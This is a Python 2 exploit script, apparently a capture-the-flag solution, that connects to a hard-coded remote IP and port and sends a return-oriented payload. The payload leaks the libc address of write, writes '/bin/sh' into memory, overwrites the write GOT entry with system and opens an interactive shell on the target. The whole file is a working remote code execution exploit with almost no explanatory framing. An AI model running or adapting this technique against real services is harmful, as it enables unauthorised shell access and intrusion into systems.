from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

def remote_debug(flag):
    if(flag == True):
        print"[+] Remote debugging mode"
        time.sleep(10)
        raw_input("Dbg is ready?")

#nc 175.119.158.133 9091
host = '175.119.158.133'
#host = 'localhost'
port = 9091

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

if len(sys.argv) == 2:
	remote_debug(True)
else:
	remote_debug(False)

read_plt = 0x80484f0
write_plt = 0x8048590
write_got = 0x804c034
pppr = 0x8048f0d
bss = 0x804cbc8
cmd = "/bin/sh\x00"

s.send("LEAP\n")
s.send("3\n")
s.send("0\n")
time.sleep(1)

payload = ""
payload+= "A"*8                     # dummy

# Leak write addr
payload+= pack("<L", write_plt)
payload+= pack("<L", pppr)
payload+= pack("<L", 1)
payload+= pack("<L", write_got)
payload+= pack("<L", 4)

# Read /bin/sh system command
payload+= pack("<L", read_plt)
payload+= pack("<L", pppr)
payload+= pack("<L", 0)
payload+= pack("<L", bss)
payload+= pack("<L", len(cmd))

# Overwrite write got address to system address
payload+= pack("<L", read_plt)
payload+= pack("<L", pppr)
payload+= pack("<L", 0)
payload+= pack("<L", write_got)
payload+= pack("<L", 4)

# Trigger
payload+= pack("<L", write_plt)
payload+= pack("<L", 0xdeadbeef)
payload+= pack("<L", bss)

s.send(payload + "\n")
time.sleep(1)

recv_until(s, "artist")
recv_until(s, "-----------------------------------------------------\n")
recv_until(s, "\n\n\n\n\n\n\n")

write_addr = unpack("<L", s.recv(4))[0]
print "[INFO] Leaked write addr: %s " % hex(write_addr)

'''
gdb-peda$ print write
$2 = {<text variable, no debug info>} 0xd97e0 <write>
gdb-peda$ print system
$3 = {<text variable, no debug info>} 0x3b180 <system>
'''
write_offset = 0xd97e0
libc_base = write_addr - write_offset
system_offset = 0x3b180
system_addr =  libc_base + system_offset
print "[INFO] system  addr: %s " % hex(system_addr)

s.send(cmd)
time.sleep(1)

s.send(pack("<L", system_addr))
time.sleep(1)

print "[INFO] You got a shell!"
try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass


